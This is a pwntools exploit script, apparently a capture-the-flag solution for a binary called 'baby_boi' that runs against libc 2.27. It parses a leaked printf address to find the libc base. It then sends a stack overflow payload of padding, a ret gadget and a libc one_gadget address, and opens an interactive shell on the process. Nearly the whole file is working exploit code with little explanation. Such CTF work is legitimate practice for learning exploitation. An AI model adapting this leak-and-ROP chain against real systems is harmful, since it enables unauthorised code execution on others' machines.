'''
Author: Samrito
Date: 2022-01-20 16:47:14
LastEditors: Samrito
LastEditTime: 2022-01-20 18:41:22
'''
from urllib import response
from pwn import *

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

context.arch = 'amd64'
context.log_level = 'debug'
context.os = 'linux'

io = process(argv=['./baby_boi'])

elf = ELF('./baby_boi')
libc = ELF('./libc-2.27.so')

io.recvuntil('Hello!\n')
res = io.recvline()
printf_got = res.split(b' ')[-1][:-1]
log.info(printf_got.decode('utf-8'))

printf_libc_addr = libc.symbols['printf']
base = int(printf_got, 16) -  printf_libc_addr

#debug('b * main')

ret_addr = 0x040054e
gadget_libc_addr = 0x4f322

gadget_addr = gadget_libc_addr + base

payload = flat([b'@'*0x28, ret_addr,gadget_addr])

io.sendline(payload)

io.interactive()